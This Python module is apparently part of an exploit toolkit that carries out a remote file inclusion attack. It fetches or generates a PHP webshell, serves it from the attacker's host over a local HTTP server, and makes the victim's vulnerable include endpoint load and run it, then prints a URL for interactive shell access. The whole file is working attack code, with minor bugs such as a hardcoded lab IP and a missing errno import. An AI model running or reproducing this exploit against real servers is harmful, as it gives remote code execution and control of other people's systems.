import sys, os, urllib.request, subprocess, random, socket, threading, time
from . import create_webshell

class color:
	PURPLE = '\033[1;35;48m'
	CYAN = '\033[1;36;48m'
	BOLD = '\033[1;37;48m'
	BLUE = '\033[1;34;48m'
	GREEN = '\033[1;32;48m'
	YELLOW = '\033[1;33;48m'
	RED = '\033[1;31;48m'
	BLACK = '\033[1;30;48m'
	UNDERLINE = '\033[4;37;48m'
	END = '\033[1;37;0m'


def RFI(victim_info, attacker_info, general_info, arguments):

	# Check if endpoint is up
	if not urllib.request.urlopen("http://192.168.100.7:80/file_inclusion.php").getcode() == 200:
		print(color.RED + '[-] The endpoint is not alive, please check if the url provided is correct' + color.END)
		sys.exit(1)
	
	if arguments.repeat == None:
		print(color.CYAN + '''
		##################################################################################
		#										 #
		# 	                 REMOTE FILE INCLUSION VULNERABILITY			 #		
		#										 #
		##################################################################################
		''' + color.END)
		print(color.GREEN + '[*]' + color.END + ' You executed this exploit in interactive mode')
		print(color.GREEN + '[*]' + color.END + ' If you follow the following link, you will be able to mess around with the webshell')

	# HTTPS vs HTTP
	s = ''
	if victim_info['secure'] == 'True':
		s = 's'

	# Getting values
	v_ip = victim_info['ip']
	v_port = victim_info['port']
	a_ip = attacker_info['ip']
	v_rec_path = victim_info['file_inclusion_path']
	
	random_port = random.randint(1024, 65536)
	# Making sure the random port is not in use
	while check_port(a_ip, random_port):
		random_port = random.randint(1024, 65536)
	
	# Get script location
	script_dir = os.path.dirname(os.path.realpath(__file__))
	if script_dir[len(script_dir) -1] != '/':
		script_dir += '/'
	
	# If not on repeat, allow user to interact with webshell
	if not arguments.repeat:
		# Get webshell from github
		response = urllib.request.urlopen('https://raw.githubusercontent.com/artyuum/simple-php-web-shell/master/index.php')
		webshell = response.read()

		store_webshell = open(script_dir + 'my_webshell.php', 'wb')
		store_webshell.write(webshell)
		store_webshell.close()

		# Interactive option
		print('\n' + color.RED + 'KEEP THIS SCRIPT RUNNING WHILE USING THE WEBSHELL' + color.END +'\n\n')
		url = 'http' + s + '://' + v_ip + ':' + v_port + v_rec_path + 'http://' + a_ip + ':' + str(random_port) + '/FileInclusion/my_webshell.php'
		print('In order to use the webshell access: ' + color.GREEN + url + color.END)
		try:
			subprocess.Popen('python3 -m http.server ' + str(random_port) + ' 1> /dev/null 2>/dev/null', shell=True).wait()
		except KeyboardInterrupt:
			print('\n[+] Exiting...')
			os.remove(script_dir + 'my_webshell.php')

	else:
		# Create and start download server to allow the victim website to fetch our file
		download_server = threading.Thread(target=task, args=[random_port])
		download_server.start()
		webshell = open(script_dir + 'my_webshell.php' , 'w')
		webshell.write(create_webshell.gen())
		webshell = open(script_dir + 'my_webshell.php', 'r')
		
		# Wait for the python server to open
		time.sleep(1)
		url = 'http' + s + '://' + v_ip + ':' + v_port + v_rec_path + 'http://' + a_ip + ':' + str(random_port) + '/FileInclusion/my_webshell.php'
		urllib.request.urlopen(url)
		# Give time for webshell to execute the commands
		time.sleep(1)
		os.remove(script_dir + 'my_webshell.php')
		

	
def check_port(ip, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.bind((ip, port))
	except socket.error as e:
		if e.errno == errno.EADDRINUSE:
			return True
		else:
			# something else raised the socket.error exception
			print(e)
			sys.exit()
	return False

	s.close()
	
def task(random_port):
	subprocess.Popen('python3 -m http.server ' + str(random_port) + ' 1>/dev/null 2>/dev/null', shell=True)
